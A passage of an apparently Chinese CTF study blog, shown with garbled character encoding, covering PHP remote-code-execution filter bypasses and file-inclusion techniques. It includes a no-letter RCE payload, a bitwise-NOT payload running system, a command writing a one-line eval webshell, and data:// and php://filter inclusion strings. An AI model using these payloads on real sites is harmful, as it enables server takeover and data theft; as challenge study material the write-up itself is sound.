class="variable">$wllm</span>)) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;sAlGhulè¯´ç”¨å­—æ¯æ•°å­—æ˜¯æ²¡æœ‰çµé­‚çš„ï¼&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4è¯´ï¼šä¸é”™å“¦å°ä¼™å­ï¼Œå¯ä½ èƒ½æ‹¿åˆ°flagå—ï¼Ÿ&quot;</span>; </span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;è”¡æ€»è¯´ï¼šæ³¨æ„å®¡é¢˜ï¼ï¼ï¼&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡æ„é€ assert($<em>POST[</em>]);ç„¶åé€šè¿‡poatä¼ å‚_&#x3D;phpinfo()[ç³»ç»Ÿæ‰€è¦æ‰§è¡Œçš„å‘½ä»¤å³å¯</p><p>payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">%24_%3d%5b%5d%3b%24_%3d%<span class="number">40</span>%<span class="number">22</span>%24_%<span class="number">22</span>%3b%24_%3d%24_%5b%<span class="number">27</span>!%<span class="number">27</span>%3d%3d%<span class="number">27</span>%<span class="number">40</span>%<span class="number">27</span>%5d%3b%24___%3d%24_%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24____%3d%27_%<span class="number">27</span>%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24_%3d%<span class="number">24</span>%24____%3b%24___(%24_%5b_%5d)%3b</span><br></pre></td></tr></table></figure><p>æœç´¢disable_functionsï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°è¢«ç¦ç”¨çš„å‡½æ•°</p><p><img src="/img/1722310534826-23.png" alt="img"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,<span class="built_in">exec</span>,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dlpc</span><br></pre></td></tr></table></figure><p>Payload:</p><p>_&#x3D;file_put_contents(â€˜1.phpâ€™,â€™<?php eval($_POST['aa']);?>â€˜);</p><p>é€šè¿‡å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œèšå‰‘è¿æ¥ï¼Œå¾—flagã€‚</p><h5 id="å–åç»•è¿‡"><a href="#å–åç»•è¿‡" class="headerlink" title="å–åç»•è¿‡"></a>å–åç»•è¿‡</h5><p><strong>å¯¹æ‰€è¦æ‰§è¡Œçš„å‘½ä»¤è¿›è¡Œå–åå³å¯</strong></p><p><strong>[SWPUCTF 2021 æ–°ç”Ÿèµ›]hardrce</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;wllm&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line">    $wllm = $_GET[<span class="string">&#x27;wllm&#x27;</span>]; </span><br><span class="line">    $blacklist = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,]; </span><br><span class="line">    foreach ($blacklist <span class="keyword">as</span> $blackitem) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $wllm)) &#123; </span><br><span class="line">        die(<span class="string">&quot;LTLTè¯´ä¸èƒ½ç”¨è¿™äº›å¥‡å¥‡æ€ªæ€ªçš„ç¬¦å·å“¦ï¼&quot;</span>); </span><br><span class="line">    &#125;&#125; </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,$wllm)) </span><br><span class="line">&#123; </span><br><span class="line">    die(<span class="string">&quot;Ra&#x27;s Al Ghulè¯´ä¸èƒ½ç”¨å­—æ¯å“¦ï¼&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line">echo <span class="string">&quot;NoVic4è¯´ï¼šä¸é”™å“¦å°ä¼™å­ï¼Œå¯ä½ èƒ½æ‹¿åˆ°flagå—ï¼Ÿ&quot;</span>; </span><br><span class="line"><span class="built_in">eval</span>($wllm); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    echo <span class="string">&quot;è”¡æ€»è¯´ï¼šæ³¨æ„å®¡é¢˜ï¼ï¼ï¼&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/EddieMurphy-blogs/p/17747410.html">æ— å­—æ¯rce</a>ï¼šå­—æ¯è¢«è¿‡æ»¤äº†ï¼Œä¸”è®¾ç½®äº†ä¸€ä¸ªé»‘åå•è¿‡æ»¤äº†è®¸å¤šä¸œè¥¿</p><p>æ¶‰åŠçŸ¥è¯†ç‚¹ï¼šå–åç»•è¿‡</p><p>urlç¼–ç å–åç»•è¿‡ ï¼šå°±æ˜¯æˆ‘ä»¬å°†phpä»£ç urlç¼–ç åå–åï¼Œæˆ‘ä»¬ä¼ å…¥å‚æ•°åæœåŠ¡ç«¯è¿›è¡Œurlè§£ç ï¼Œè¿™æ—¶ç”±äºå–ååï¼Œä¼šurlè§£ç æˆä¸å¯æ‰“å°å­—ç¬¦ï¼Œè¿™æ ·æˆ‘ä»¬å°±ä¼šç»•è¿‡</p><p>payload:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo urlencode(~<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line">echo <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">echo urlencode(~<span class="string">&#x27;ls /&#x27;</span>);<span class="comment">#ls / -&gt; cat /flag</span></span><br><span class="line">?&gt;</span><br><span class="line"><span class="comment">#%8C%86%8C%8B%9A%92</span></span><br><span class="line"><span class="comment">#%93%8C%DF%D0</span></span><br><span class="line"><span class="comment">#payload:~(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);è®°ä½ç»“å°¾è¦åŠ åˆ†å·</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶åŒ…å«</title>
      <link href="/2024/07/23/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2024/07/23/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p><code>æ–‡ä»¶åŒ…å«æ¼æ´</code>æ˜¯æŒ‡å®¢æˆ·ç«¯ï¼ˆä¸€èˆ¬ä¸ºæµè§ˆå™¨ï¼‰ç”¨æˆ·é€šè¿‡è¾“å…¥æ§åˆ¶åŠ¨æ€åŒ…å«åœ¨æœåŠ¡å™¨çš„æ–‡ä»¶ï¼Œä»è€Œå¯¼è‡´æ¶æ„ä»£ç çš„æ‰§è¡ŒåŠæ•æ„Ÿä¿¡æ¯çš„æ³„éœ²ï¼Œä¸»è¦åŒ…æ‹¬<code>æœ¬åœ°æ–‡ä»¶åŒ…å«LFI</code>å’Œ<code>è¿œç¨‹æ–‡ä»¶åŒ…å«RFI</code>ä¸¤ç§å½¢å¼</p><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><p>å¸¸è§çš„æ–‡ä»¶åŒ…å«æ¼æ´çš„å½¢å¼</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="ç›®å½•"><a href="#ç›®å½•" class="headerlink" title="ç›®å½•"></a><strong>ç›®å½•</strong></h2><ul><li>PHPä¼ªåè®®åˆ©ç”¨</li><li>æ—¥å¿—æ–‡ä»¶åŒ…å«</li><li>åŒ…å«ä¸´æ—¶æ–‡ä»¶</li><li>è¿œç¨‹æ–‡ä»¶åŒ…å«</li></ul><p><strong>æ¼æ´å±å®³</strong></p><ol><li>è¯»å–æ•æ„Ÿæ–‡ä»¶</li><li>è·å–webshell</li><li>ä»»æ„å‘½ä»¤æ‰§è¡Œ</li><li>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ ¹æ®LFIæ¼æ´çš„æ€§è´¨ï¼Œå¯ä»¥è¿è¡Œç³»ç»Ÿå¯æ‰§è¡Œæ–‡ä»¶</li></ol><p><strong>å­˜åœ¨æ¼æ´çš„å‡½æ•°</strong>ï¼š</p><ul><li><strong>include()</strong> åªæœ‰ä»£ç æ‰§è¡Œåˆ°æ­¤å‡½æ•°æ—¶æ‰å°†æ–‡ä»¶åŒ…å«è¿›æ¥ï¼Œå‘ç”Ÿé”™è¯¯æ—¶åªè­¦å‘Šå¹¶ç»§ç»­æ‰§è¡Œã€‚</li><li><strong>require()</strong> åªè¦ç¨‹åºæ‰§è¡Œï¼Œç«‹å³è°ƒç”¨æ­¤å‡½æ•°åŒ…å«æ–‡ä»¶ï¼Œå‘ç”Ÿé”™è¯¯æ—¶ï¼Œä¼šè¾“å‡ºé”™è¯¯ä¿¡æ¯å¹¶ç«‹å³ç»ˆæ­¢ç¨‹åºã€‚</li><li><strong>include_once()</strong> åŠŸèƒ½include()ä¸€æ ·ï¼ŒåŒºåˆ«åœ¨äºå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œç¨‹åºåªè°ƒç”¨ä¸€æ¬¡ã€‚</li><li><strong>require_once()</strong> åŠŸèƒ½require()ä¸€æ ·ï¼ŒåŒºåˆ«åœ¨äºå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œç¨‹åºåªè°ƒç”¨ä¸€æ¬¡ã€‚</li></ul><p>æ–‡ä»¶åŒ…å«åŠŸèƒ½è¦å®ç°ï¼Œ<code>éœ€è¦åœ¨PHPçš„é…ç½®æ–‡ä»¶php.iniä¸­å¼€å¯allow_url_includeï¼›å¦‚æœæ˜¯è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œåˆ™é™¤æ­¤ä¹‹å¤–è¿˜éœ€è¦å¼€å¯allow_url_fopenã€‚</code></p><p>è€ƒè™‘å¸¸è§çš„å‡ ç§åŒ…å«æ–¹å¼</p><ul><li>åŒç›®å½•åŒ…å« <code>file=.htaccess</code></li><li>ç›®å½•éå† <code>?file=../../../../../../../../../var/lib/locate.db</code></li><li>æ—¥å¿—æ³¨å…¥ <code>?file=../../../../../../../../../var/log/apache/error.log</code></li><li>åˆ©ç”¨ <code>/proc/self/environ</code></li></ul><h2 id="æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>æœ¬åœ°æ–‡ä»¶åŒ…å«</h2><p>ç®€ä»‹ï¼š</p><p>æ–‡ä»¶åŒ…å«æ¼æ´çš„äº§ç”ŸåŸå› æ˜¯ PHP è¯­è¨€åœ¨é€šè¿‡å¼•å…¥æ–‡ä»¶æ—¶ï¼Œå¼•ç”¨çš„æ–‡ä»¶åï¼Œç”¨æˆ·å¯æ§ï¼Œç”±äºä¼ å…¥çš„æ–‡ä»¶åæ²¡æœ‰ç»è¿‡åˆç†çš„æ ¡éªŒï¼Œæˆ–è€…æ ¡éªŒè¢«ç»•è¿‡ï¼Œä»è€Œæ“ä½œäº†é¢„æƒ³ä¹‹å¤–çš„æ–‡ä»¶ï¼Œå°±å¯èƒ½å¯¼è‡´æ„å¤–çš„æ–‡ä»¶æ³„éœ²ç”šè‡³æ¶æ„çš„ä»£ç æ³¨å…¥ã€‚</p><p>å½“è¢«åŒ…å«çš„æ–‡ä»¶åœ¨æœåŠ¡å™¨æœ¬åœ°æ—¶ï¼Œå°±å½¢æˆçš„æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´</p><h3 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="ç›®å½•éå†"></a>ç›®å½•éå†</h3><p>ç®€ä»‹ï¼š</p><p>ç›®å½•ç©¿è¶Šï¼ˆä¹Ÿè¢«ç§°ä¸ºç›®å½•éå†&#x2F;directory traversal&#x2F;path traversalï¼‰æ˜¯é€šè¿‡ä½¿ç”¨ <code>../</code> ç­‰ç›®å½•æ§åˆ¶åºåˆ—æˆ–è€…æ–‡ä»¶çš„ç»å¯¹è·¯å¾„æ¥è®¿é—®å­˜å‚¨åœ¨æ–‡ä»¶ç³»ç»Ÿä¸Šçš„ä»»æ„æ–‡ä»¶å’Œç›®å½•ï¼Œç‰¹åˆ«æ˜¯åº”ç”¨ç¨‹åºæºä»£ç ã€é…ç½®æ–‡ä»¶ã€é‡è¦çš„ç³»ç»Ÿæ–‡ä»¶ç­‰</p><h3 id="PHPå°è£…åè®®-ä¼ªåè®®"><a href="#PHPå°è£…åè®®-ä¼ªåè®®" class="headerlink" title="PHPå°è£…åè®®(ä¼ªåè®®)"></a>PHPå°è£…åè®®(ä¼ªåè®®)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">File://  è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</span><br><span class="line">http://  è®¿é—®HTTPsç½‘å€</span><br><span class="line">ftp://  è®¿é—®ftp URL</span><br><span class="line">Php://  è®¿é—®è¾“å…¥è¾“å‡ºæµ</span><br><span class="line">Zlib://  å‹ç¼©æµ</span><br><span class="line">Data://  æ•°æ®</span><br><span class="line">Ssh2://  security shell2</span><br><span class="line">Expect://  å¤„ç†äº¤äº’å¼çš„æµ</span><br><span class="line">Glob://  æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„</span><br></pre></td></tr></table></figure><p>php.inié…ç½®æ–‡ä»¶ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">allow_url_fopen=off å³ä¸å¯ä»¥åŒ…å«è¿œç¨‹æ–‡ä»¶ã€‚php4å­˜åœ¨è¿œç¨‹åŒ…å«&amp;æœ¬åœ°åŒ…å«ï¼Œphp5ä»…å­˜åœ¨æœ¬åœ°åŒ…å«</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ç‰ˆæœ¬&gt;&#x3D;5.2</p><h4 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h4><p>ä½œç”¨ï¼š</p><p>ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨CTFä¸­é€šå¸¸ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶,ä¸”ä¸å—allow_url_fopenä¸allow_url_includeçš„å½±å“ã€‚</p><p><code>include()/require()/include_once()/require_once()</code>å‚æ•°å¯æ§çš„æƒ…å†µä¸‹</p><p>å¦‚å¯¼å…¥ä¸ºé.phpæ–‡ä»¶ï¼Œåˆ™ä»æŒ‰ç…§phpè¯­æ³•è¿›è¡Œè§£æï¼Œè¿™æ˜¯include()å‡½æ•°æ‰€å†³å®šçš„</p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#1. file://[æ–‡ä»¶çš„ç»å¯¹è·¯å¾„å’Œæ–‡ä»¶å]</span><br><span class="line">http://127.0.0.1/include.php?file=file://C:\phpStudy\PHPTutorial\WWW\phpinfo.txt</span><br><span class="line"></span><br><span class="line">#2. file://[æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„å’Œæ–‡ä»¶å]</span><br><span class="line">http://127.0.0.1/include.php?file=./phpinfo.txt</span><br><span class="line"></span><br><span class="line">#3. file://[ç½‘ç»œè·¯å¾„å’Œæ–‡ä»¶å]</span><br><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="**php:&#x2F;&#x2F;**filter"></a>**php:&#x2F;&#x2F;**<strong>filter</strong></h4><blockquote><p>åˆ©ç”¨<code>php://filter</code>æŸ¥çœ‹æºä»£ç ï¼š</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter`æ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ï¼›åœ¨æ–‡ä»¶åŒ…å«ä¸­ç”¨äºè¯»å–æ–‡ä»¶å†…å®¹ï¼Œè¯»å–åè¾“å‡º`base64ç¼–ç `åçš„å†…å®¹ï¼Œè¦è·å–çœŸå®å†…å®¹çš„è¯ï¼Œ`éœ€è¦è¿›è¡Œbase64è§£ç </span><br></pre></td></tr></table></figure><p>ä»£ç å®ä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=index.php</span><br><span class="line">?file=php://filter/convert.base64-encode/resource=../sss.php</span><br></pre></td></tr></table></figure><h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a><strong>php:&#x2F;&#x2F;input</strong></h4><p>åˆ©ç”¨phpä¼ªåè®®ï¼šphp:&#x2F;&#x2F;input</p><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ol><li>PHP.ini ä¸­ allow_url_include&#x3D; On php &lt;5.0 ï¼Œallow_url_include&#x3D;Off ä¹Ÿå¯ä»¥</li></ol><p><code>php://input</code>æ˜¯ä¸ªå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµã€‚ä½¿ç”¨æ—¶ï¼Œå°†è¦è¾“å…¥çš„æ•°æ®ä»¥postæ–¹å¼æäº¤</p><h4 id="dataä¼ªåè®®"><a href="#dataä¼ªåè®®" class="headerlink" title="dataä¼ªåè®®"></a><strong>dataä¼ªåè®®</strong></h4><p>åˆ©ç”¨phpä¼ªåè®®ï¼š<code>data</code></p><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php &gt; 5.2</span><br><span class="line">allow_url_fopen=On &amp;&amp; allow_url_include=On</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">?file=data:text/plain,&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br><span class="line">?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure><h4 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a><strong>phar:&#x2F;&#x2F;</strong></h4><p>phar:&#x2F;&#x2F; æ•°æ®æµåŒ…è£…å™¨è‡ªPHP 5.3.0èµ·å¼€å§‹ã€‚è¿™ä¸ªå‚æ•°æ˜¯å°±æ˜¯<code>phpè§£å‹ç¼©åŒ…</code>çš„ä¸€ä¸ªå‡½æ•°ï¼Œä¸ç®¡ç›®æ ‡æ–‡ä»¶åç¼€æ˜¯ä»€ä¹ˆï¼Œéƒ½å°†å…¶å½“åšå‹ç¼©åŒ…æ¥è§£å‹</p><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP&gt;= 5.3.0</span><br></pre></td></tr></table></figure><p>ç”¨æ³•æ ¼å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=phar://å‹ç¼©åŒ…/å†…éƒ¨æ–‡ä»¶</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼šç»å¯¹è·¯å¾„æˆ–ç›¸å¯¹è·¯å¾„å‡å¯ï¼›å‹ç¼©åŒ…åªèƒ½ä½¿ç”¨<code>zipåè®®</code>å‹ç¼©</p></blockquote><h4 id="zip"><a href="#zip" class="headerlink" title="zip:&#x2F;&#x2F;"></a><strong>zip:&#x2F;&#x2F;</strong></h4><p>zipä¼ªåè®®å’Œpharåè®®ç±»ä¼¼,ä½†æ˜¯ç”¨æ³•ä¸ä¸€æ ·ã€‚</p><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5.2.17 =&lt;php &lt;= 7.0.12</span><br></pre></td></tr></table></figure><p>è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=zip://[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]#[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å]zip://xxx.png#shell.phpæˆ–zip://xxx.zip#shell.php</span><br></pre></td></tr></table></figure><h2 id="sessionæ–‡ä»¶åŒ…å«"><a href="#sessionæ–‡ä»¶åŒ…å«" class="headerlink" title="sessionæ–‡ä»¶åŒ…å«"></a><strong>sessionæ–‡ä»¶åŒ…å«</strong></h2><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ol><li>sessionçš„å­˜å‚¨ä½ç½®å¯ä»¥è·å– sessionä¸­çš„å†…å®¹å¯ä»¥è¢«æ§åˆ¶ï¼Œä¼ å…¥æ¶æ„ä»£ç </li></ol><p>åˆ©ç”¨æ€è·¯ï¼š</p><ol><li>é€šè¿‡å‚æ•°nameå†™å…¥æ¶æ„ä»£ç åˆ°sessionæ–‡ä»¶ä¸­ï¼Œç„¶åé€šè¿‡æ–‡ä»¶åŒ…å«æ¼æ´æ‰§è¡Œæ­¤æ¶æ„ä»£ç getshell</li><li>é€šè¿‡phpinfoçš„ä¿¡æ¯å¯ä»¥è·å–åˆ°sessionçš„å­˜å‚¨ä½ç½®</li></ol><p>æ­¤æ—¶æˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªé¡µé¢ï¼Œå°†ç”¨æˆ·çš„getæ•°æ®å­˜å‚¨åˆ°sessionä¸­</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">$$name=$$_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">$$_SESSION[<span class="string">&quot;name&quot;</span>]=$$name;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>å¯è§æ­¤æ—¶å·²ç»å°† <strong>phpinfo</strong> å†™å…¥åˆ° sessionæ–‡ä»¶ä¸­ï¼Œæ­¤æ—¶æˆ‘ä»¬åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´å»åŒ…å«è¿™ä¸ªæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=../../../../var/lib/php/sessions/sess_sdmofnu8knlh9jlqe89l8smduu</span><br></pre></td></tr></table></figure><h2 id="æ—¥å¿—åŒ…å«"><a href="#æ—¥å¿—åŒ…å«" class="headerlink" title="æ—¥å¿—åŒ…å«"></a>æ—¥å¿—åŒ…å«</h2><p>å¸¸è§çš„æ—¥å¿—æ–‡ä»¶å­˜å‚¨è·¯å¾„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apache+Linux`æ—¥å¿—é»˜è®¤è·¯å¾„ï¼š`/etc/httpd/logs/access.log`ã€`/var/log/httpd/access.log`ã€`var/log/apache2/access.log`ã€`var/log/apache2/error.log</span><br><span class="line">apache+win2003`æ—¥å¿—é»˜è®¤è·¯å¾„ï¼š`D:\xampp\apache\logs\access.log`ã€`D:\xampp\apache\logs\error.log</span><br><span class="line">IIS6.0+win2003`é»˜è®¤æ—¥å¿—æ–‡ä»¶ï¼š`C:\WINDOWS\system32\Logfiles` `IIS7.0+win2003` é»˜è®¤æ—¥å¿—æ–‡ä»¶ï¼š`%SystemDrive%\inetpub\logs\LogFiles</span><br></pre></td></tr></table></figure><p><code>nginx</code> æ—¥å¿—æ–‡ä»¶ï¼šæ—¥å¿—æ–‡ä»¶åœ¨ç”¨æˆ·å®‰è£…ç›®å½•logsç›®å½•ä¸‹,å‡è®¾å®‰è£…è·¯å¾„ä¸º<code>/usr/local/nginx</code>æˆ–è€…<code>var/log/nginx/</code>,é‚£æ—¥å¿—ç›®å½•å°±æ˜¯åœ¨<code>/usr/local/nginx/logs</code>æˆ–è€…<code>var/log/nginx/access.log</code>ä¸‹é¢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apache+linux` 